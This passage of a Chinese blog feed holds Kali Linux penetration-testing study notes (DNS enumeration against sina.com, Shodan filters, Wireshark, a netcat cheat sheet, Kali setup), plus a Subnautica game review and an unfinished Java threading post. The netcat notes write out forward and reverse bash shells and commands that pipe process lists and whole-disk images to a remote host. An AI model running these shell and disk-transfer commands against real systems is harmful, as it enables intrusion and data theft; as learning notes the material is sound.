id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h1><ul><li>type: AXFR</li><li>dig @ns1.example.com example.com axfr</li><li>host -T -l sina.com</li></ul><h1 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h1><ul><li>fierce -dnsserver 8.8.8.8  -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsmap sina.com -w dns.txt</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnsrecon -t std -d sina.com</li><li>将多个字典集成1个大字典，熟练使用一两个dns爆破命令。</li></ul><h1 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h1><ul><li>Whois</li><li>whois -h whois.apnic.net 192.0.43.10</li></ul><h1 id="信息搜集——搜索引擎"><a href="#信息搜集——搜索引擎" class="headerlink" title="信息搜集——搜索引擎"></a>信息搜集——搜索引擎</h1><ul><li><p>公司新闻动态</p></li><li><p>重要雇员信息</p></li><li><p>机密文档/网络拓扑</p></li><li><p>用户名密码</p></li><li><p>目标系统软硬件技术架构</p></li><li><p>Google Hacking、Baidu Hacking、Bing Hacking</p></li></ul><h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><ul><li><p>搜索互联网的设备</p></li><li><p>Banner:http、ftp、ssh、telnet</p></li><li><p><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></p></li><li><p>常见filter</p></li><li><p>net(192.168.20.1)</p></li><li><p>city</p></li><li><p>country(CN、US)</p></li><li><p>port(80、21、22、23)</p></li><li><p>os</p></li><li><p>Hostname(主机域名)</p></li><li><p>server</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WireShark&amp;TCPdump</title>
      <link href="/posts/f94e8577.html"/>
      <url>/posts/f94e8577.html</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul><li><p>抓包嗅探协议分析</p></li><li><p>安全专家必备技能</p></li><li><p>抓包引擎</p><ul><li>Libpcap9——Linux</li><li>Winpcap10——Windows</li></ul></li><li><p>解码能力</p><a id="more"></a></li></ul><h2 id="数据包的分层结构"><a href="#数据包的分层结构" class="headerlink" title="数据包的分层结构"></a>数据包的分层结构</h2><ul><li>常见协议包<ul><li>ARP</li><li>ICMP</li><li>TCP</li><li>UDP</li><li>DNS</li><li>HTTP</li><li>FTP</li></ul></li><li>wireshark官网有各种协议的包供下载</li></ul><h2 id="信息统计功能-statistics"><a href="#信息统计功能-statistics" class="headerlink" title="信息统计功能 statistics"></a>信息统计功能 statistics</h2><ul><li>节点数 EndPoints</li><li>协议分布  Protocol Hierarchy</li><li>包大小 Packet Lengths</li><li>会话    Conversations</li><li>解码方式 Decode As…</li><li>专家系统 Expert information</li></ul><h2 id="企业抓包部署方案"><a href="#企业抓包部署方案" class="headerlink" title="企业抓包部署方案"></a>企业抓包部署方案</h2><ul><li>Sniffer</li><li>全流量分析</li></ul><h1 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h1><h1 id="TCPDMUP——筛选"><a href="#TCPDMUP——筛选" class="headerlink" title="TCPDMUP——筛选"></a>TCPDMUP——筛选</h1><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具"></a>过程文档记录工具</h1><ul><li>dradis</li><li>keepnote</li><li>truecrypt</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工具中的瑞士军刀-NETCAT</title>
      <link href="/posts/caae728a.html"/>
      <url>/posts/caae728a.html</url>
      
        <content type="html"><![CDATA[<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul><li>nc -nv 1.1.1.1 110</li></ul><a id="more"></a><h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul><li>nc -l -p 4444</li><li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure></li></ul><h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul><li>传输文件<ul><li>A:<code>nc -lp 333 &gt; 1.mp4</code></li><li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li><li>或</li><li>A:<code>nc -lp 333 &lt; 1.mp4 -q 1</code></li><li>B:<code>nc -vn 333 &gt; 1.mp4</code></li></ul></li><li>传输目录<ul><li>A:<code>tar -cvf -music/ | nc -lp 333 -q 1</code></li><li>B:<code>nc -nv 1.1.1.1 333 | tar -xvf -</code></li></ul></li><li>传输加密文件<ul><li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li><li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li></ul></li></ul><h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul><li>A:<code>cat 1.mp4 | nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li></ul><h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul><li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li><li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li></ul><h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul><li><code>nc -lp 333|dd of=/dev/sda</code></li><li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li></ul><h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul><li>正向：<ul><li>A:<code>nc -lp 333 -c bash</code></li><li>B:<code>nc -nv 1.1.1.1 333</code></li></ul></li><li>反向：<ul><li>A:<code>nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li></ul></li><li>注：Windows把bash改成cmd</li></ul><h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul><li>NC缺乏加密和身份验证的能力</li><li>Ncat</li><li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li><li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li><li>不同平台/系统 nc参数功能不尽相同</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试实验环境搭建</title>
      <link href="/posts/62094550.html"/>
      <url>/posts/62094550.html</url>
      
        <content type="html"><![CDATA[<ul><li>Windows</li><li>Redhat、Ubuntu<ul><li>安装LAMP</li></ul></li><li>Metasploitable</li><li>m0n0wall<a id="more"></a>下面这个地址的虚拟机环境本是用于测试其中的应用<br><a href="https://www.turnkeylinux.org/" target="_blank" rel="noopener">https://www.turnkeylinux.org/</a><br>win10地址<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali定制</title>
      <link href="/posts/72b001b3.html"/>
      <url>/posts/72b001b3.html</url>
      
        <content type="html"><![CDATA[<p>新安装Kali后需要做的一些操作</p><a id="more"></a><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">vim &#x2F;etc&#x2F;apt&#x2F;sources.list<br></code></pre></td></tr></table></figure><blockquote><p>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>#阿里云<br>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p></blockquote><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get update<br>apt-get dist-upgrade<br></code></pre></td></tr></table></figure><h1 id="安装适合自己的工具软件"><a href="#安装适合自己的工具软件" class="headerlink" title="安装适合自己的工具软件"></a>安装适合自己的工具软件</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">- apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule amule qbittorrent geany stardict meld meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y<br></code></pre></td></tr></table></figure><h1 id="firefox浏览器插件"><a href="#firefox浏览器插件" class="headerlink" title="firefox浏览器插件"></a>firefox浏览器插件</h1><ul><li>flashgot、autoproxy、TamperData、cookie、importer、CookiesManager、User Agent、Switcher、HackBar、Live http header、FireBug、Download YouTube Videos as MP4、Flagfox、hashr、XSS Me、SQL Inject Me</li></ul><h1 id="显卡驱动-密码破解"><a href="#显卡驱动-密码破解" class="headerlink" title="显卡驱动(密码破解)"></a>显卡驱动(密码破解)</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get dist-upgrade<br>apt-get install -y linux-headers-$&#123;uname -r&#125;<br>apt-get install nvidia-kernel-dkms<br><br>sed &#39;s&#x2F;quiet&#x2F;quiet nouveau.modeset&#x3D;0&#x2F;g&#39; -i &#x2F;etc&#x2F;default&#x2F;grub<br>update-grub<br>reboot<br></code></pre></td></tr></table></figure><ul><li>验证：<ul><li>glxinfo|grep -i “direct rendering”<ul><li>direct rendering:Yes</li></ul></li></ul></li></ul><h1 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h1><ul><li>ulimit用于限制当前shell内进程的资源使用</li><li>查看默认值<ul><li>ulimit -a</li></ul></li><li>全局配置文件：/etc/security/limits</li><li>用途<ul><li>限制堆栈大小：ulimit -s 100</li><li>限制shell内存使用：ulimit -m 5000 -v 5000</li></ul></li><li>没有直接对socket数量的限制参数<ul><li>Linux系统中一切都是文件，运行中的文件叫做进程</li><li>ulimite -n 800000</li></ul></li></ul><h1 id="笔记本模式"><a href="#笔记本模式" class="headerlink" title="笔记本模式"></a>笔记本模式</h1><ul><li>自行搜索</li></ul><h1 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h1><ul><li>Kali默认未启动所有网络服务</li></ul><p>/etc/init.d/下有各种服务的启动脚本<br>例：启动ssh</p><figure class="hljs highlight plain"><figcaption><span>start```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ./ssh">如果想下次重启后还启动ssh<br>&#96;&#96;&#96;update-rc.d ssh default<br></code></pre></td></tr></table></figure><p>default 会在 2 3 4 5运行级别启动，0 1 6关闭</p><figure class="hljs highlight plain"><figcaption><span>A defaults 80 20```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs update-rc.d">A服务启动的优先级是80 关闭的优先级是20，优先级数字小的先执行。<br><br># GFW长城防火墙<br><br>-翻墙<br>  - http代理（明文传输）<br>  - socks代理<br>  - ssh隧道<br>  - <br><br>- Goagent<br>- Tor<br>  - tor project<br>  - wiki地址：<br>    - zqktlwi4fecvo6ri.onion&#x2F;<br>    - zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion&#x2F;<br><br>- 代理的意义所在<br>  - 加密信息<br>  - 隐藏来源<br>  - 突破网络封锁<br><br>- 注意事项<br>  - 不要触及敏感地带<br>  - 不要从事非法行为<br><br>  例：<br>  给apt-get设置代理<br>  &#x2F;etc&#x2F;apt&#x2F;apt.conf<br></code></pre></td></tr></table></figure><p>  Acquire::ftp::Proxy “<a href="ftp://127.0.0.1:8087/&quot;">ftp://127.0.0.1:8087/&quot;</a><br>  Acquire::http::Proxy “<a href="http://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087/&quot;</a><br>  Acquire::https::Proxy “<a href="https://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087/&quot;</a><br>  Acquire::socks::Proxy “<a href="https://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087/&quot;</a><br>  <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>&#x2F;etc&#x2F;bash.bashrc<br></code></pre></td></tr></table></figure><br>  export ftp_proxy=”<a href="ftp://user:password@proxyIP:port&quot;">ftp://user:password@proxyIP:port&quot;</a><br>         http_proxy<br>         https_proxy<br>         socks_proxy</p><p>  ```</p><h3 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h3><p>/etc/proxychains.conf</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试及Kali初探</title>
      <link href="/posts/47d4d005.html"/>
      <url>/posts/47d4d005.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试标准PETS"><a href="#渗透测试标准PETS" class="headerlink" title="渗透测试标准PETS"></a>渗透测试标准<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">PETS</a></h1><ul><li>前期交互阶段（与客户沟通，确定测试范围，测试方式，时间等。）</li><li>情报收集阶段</li><li>威胁建模阶段（分析，确定最可行的攻击通道。）</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>后渗透测试阶段（尽可能展现威胁影响程度）</li><li>渗透测试报告<a id="more"></a></li></ul><hr><h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><ul><li>Kali命名参考印度神话</li><li>基于Debian,前身是2013年3月发布的BackTrack</li><li>用于渗透测试和安全审计</li><li>包含600+安全工具</li><li>FHS标准目录结构</li><li><ul><li>BackTrack将所有相关工具放在/pentest目录下，下分更细目录如web,database，有些工具很难界定放在哪个目录。</li></ul></li><li>定制内核（关于无线驱动）</li><li>支持ARM和手机平台（Nethunter）</li><li>开源免费（Offensi Security）</li></ul><h1 id="Kali-Linux策略"><a href="#Kali-Linux策略" class="headerlink" title="Kali Linux策略"></a>Kali Linux策略</h1><ul><li>Root用户策略（默认root）</li><li>网络服务策略（默认全部关闭，新装软件默认启动脚本不启动，需要用update.rc.d命令）</li><li>更新升级策略（随Debian,Offensive Security维护工具。）</li></ul><h1 id="Kali-VirtualBox-环境搭建"><a href="#Kali-VirtualBox-环境搭建" class="headerlink" title="Kali VirtualBox 环境搭建"></a>Kali VirtualBox 环境搭建</h1><ol><li>首先下载kali官方的VirtualBox镜像。</li><li>默认用户名密码是kali/kali,切换root用<code>sudo su</code></li><li><code>apt-get update</code></li><li><code>apt-get install linux-headers-$(uname -r)</code></li><li>安装VirtualBox增强，点击Devices–&gt;Insert GuestAdditons CD image,在桌面会出现一个光盘图标的文件。<br>运行其中对应的.run文件。</li></ol><h1 id="Kali-持久加密USB安装"><a href="#Kali-持久加密USB安装" class="headerlink" title="Kali 持久加密USB安装"></a>Kali 持久加密USB安装</h1><ol><li>VirtualBox共享Windows文件夹，将kali镜像放入其中</li><li>插入U盘</li><li>使用dmesg命令查看U盘名称（例：”sdb”）</li><li>使用GParted将sdb分区删除</li><li>使用dd命令将镜像按块写入U盘(使用watch命令查看进度，每5秒发送一次SIGUSR1信号)</li><li>使用parted从上一分区结束位置创建分区</li><li>使用LUKS加密分区<code>cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb</code></li><li>打开加密分区<code>cryptsetup luksOpen /dev/sdb3 usb</code></li><li>mkfs.ext4 /dev/mapper/usb将分区格式化成ext4</li><li>e2label /dev/mapper/usb persistence将分区卷标指定为persistence（必须是persistence——持久化的意思</li><li>完成后，在mnt目录下创建一个文件夹，将分区挂载到该文件夹处，并填入配置文件。完成后卸掉挂载，并关闭加密区。</li></ol><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir -p &#x2F;mnt&#x2F;kali<br>mount &#x2F;dev&#x2F;mapper&#x2F;kali &#x2F;mnt&#x2F;kali<br>echo &quot;&#x2F; union&quot; &gt; &#x2F;mnt&#x2F;kali&#x2F;persistence.conf<br>umount &#x2F;dev&#x2F;mapper&#x2F;kali<br>cryptsetup luksClose &#x2F;dev&#x2F;mapper&#x2F;kali<br></code></pre></td></tr></table></figure><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><ul><li>nmap            网络发现</li><li>burpsuit         http请求中间人</li><li>zap            http请求中间人</li><li>sqlmap        SQL注入</li><li>aircrack-ng    无线破解</li><li>metasploit    渗透测试框架</li><li>maltego        信息收集</li><li>john            密码破解</li><li>hydra            密码破解</li><li>wireshark        抓包</li></ul><p>实时流量显示 NetSpeed</p><p>#学习</p><ul><li>实践是最好的老师，加油。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>We are different,but we go together ----《深海迷航》</title>
      <link href="/posts/f54009a1.html"/>
      <url>/posts/f54009a1.html</url>
      
        <content type="html"><![CDATA[<p><img src="/posts/f54009a1/leviathan.png" alt><br><strong>What is a wave without the ocean,a begining without the end.</strong><br><strong>They are different,but they go together.</strong><br><strong>Now you go among the stars,and I fall among the sands.</strong><br><strong>We are different,but we go together.</strong></p><a id="more"></a><p>第一次感到对大海的恐惧，是在洛圣都开着快艇来到地图边界。天空布满灰色的乌云，环顾四周也看不到一片陆地，尽是波涛汹涌的海水。快艇随着大海蓝黑泛白的涟漪上下起伏。船慢慢沉入水中。只好游泳，水中永远是深蓝不见底，越往深处光线越暗。没有多久就被鲨鱼攻击，然后死掉了。压抑，恐惧，无助。我不知道是幽闭恐惧还是深海恐惧，这种感觉在之后的一段时间，一直让我记忆犹新。<br>后来偶然听闻有某游戏专治“深海恐惧”，我不由得又想到了这种体验。忍不住下载然后尝试。（当时是2016年，游戏还在开发阶段，虽然相比于现在有一些不足，但也都无关紧要。）<br>故事的开始主角已经进入了星际飞船“极光号”的救生舱，随着极光号的坠落，十几个逃生舱也散落在4546B这个绝大部分都是海洋的星球上。为了等待救援，不得不开始探索周边环境。看得出来这是科技非常发达的时代，主角借助PDA，配合光谱扫描仪，一点一点了解周边生态环境。也就是在这个过程中，发现了这个星球上更多的秘密。<br>身上有绿色斑点的各种生物，外星进水排水设施，嘉德斯号船员的遗址，极光号受到的未能分析出结果的损伤形式。逐渐让主角对这个星球的故事产生好奇。<br>不得不让人称赞的是这个游戏的音乐和音效。让人印象深刻的是暗礁鱼低沉悠长的叫声，让人听到就觉得孤独。深潜时捕食者的咆哮也给游戏增添了一丝紧张感。在浅水区，绿藻区，树蘑菇林，失落之河……每个区域都有独特的风景。精心设计的地图，相比于随机生成更加有美感。场景切换时的音乐，也和环境氛围完美融合。代入感极佳。<br>开始玩了大概有20多个小时，因为感到深深的孤独，就没有勇气继续玩下去了。（在后来的版本，开发商为了减轻玩家的这种痛苦，增加了一个可爱的抱抱鱼作为宠物qwq）<br>直到两年后，我又重新拾起了这个游戏。在这之间，它已经由完美世界发行，并收入WeGame平台之中，在游戏发售后IGN 也给出了9.1 Amazing的高分,也被游民星空评价为开放世界生存游戏的典范。<br>在游戏中最让我感兴趣的部分是扫描各种未知的生物。它们以各种奇妙的方式来运动，进食，共生，等等，完成自己的生命周期。<br>包括显示出重度基因修正和多处机械移植迹象的生命形式——裂空者，有机体和高科技的完美结合造就了这种强力且危险的生物。<br>随着剧情的一步步推进，主角在这个星球上收到海皇心电感应发来的讯息，让这个孤独的世界不那么孤独。玩到这里的时候，已经满脑子都是“我要见到海皇”这种想法了。<br>当主角终于找到离开的方法时，这个巨大却温柔生物却不得不走向生命的终结。<br><strong>We are different,but we go together.</strong><br>事情总是这样，不过，可以相遇就已经足够了，不是吗。<br>面对巨大生物时的震撼，各种奇妙的生命形式，面对未知的恐惧和强烈的好奇，和伴随着整个游戏进程的深深孤独感，都是令人着迷的神奇体验。</p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科幻 </tag>
            
            <tag> 生存 </tag>
            
            <tag> 沙盒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Java多线程两种实现方式的一点想法</title>
      <link href="/posts/13911.html"/>
      <url>/posts/13911.html</url>
      
        <content type="html"><![CDATA[<p>在看某本书的时候里面讲到继承Thread类和实现Runnable接口的区别。有这么一条是说“继承Thread类不能资源共享，而实现Runnable接口可以。”于是产生了以下问题。</p><a id="more"></a><p>书上的代码如下。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*实现Runnable接口可以资源共享<br>*&#x2F;<br>public class ShareResourceTest2 implements Runnable&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest2 srt1 &#x3D; new ShareResourceTest2();<br>        Thread t1 &#x3D; new Thread(srt1);<br>        Thread t2 &#x3D; new Thread(srt1);<br>        Thread t3 &#x3D; new Thread(srt1);<br>        t1.start();<br>        t2.start();<br>        t3.start();<br><br>    &#125;<br>&#125;<br><br>&#x2F;&#x2F;部分输出结果 资源共享<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;16<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;17<br></code></pre></td></tr></table></figure><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>* 继承Thread类不能实现资源共享<br>*&#x2F;<br>public class ShareResourceTest1 extends Thread&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        srt1.start();<br>        srt2.start();<br>        srt3.start();<br>    &#125;<br>&#125;<br>&#x2F;&#x2F;部分输出结果 资源没有共享<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;17<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;19<br>&#x2F;&#x2F;...<br>&#x2F;&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;1<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;18<br></code></pre></td></tr></table></figure><p>我一看不对啊，两个main方法都不一样。第一个是创建了一个Runnable然后再用这个Runnable去创建三个新的Thread。第二个直接创建了三个Thread。我陷入了沉思- -，我觉得第二个程序不能资源共享可能是这个main方法的原因，而不是因为继承了Thread类。于是我写了以下代码作为测试。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*继承Thread类，但可以资源共享。<br>*&#x2F;<br>public class ShareResourceTest1 extends Thread&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    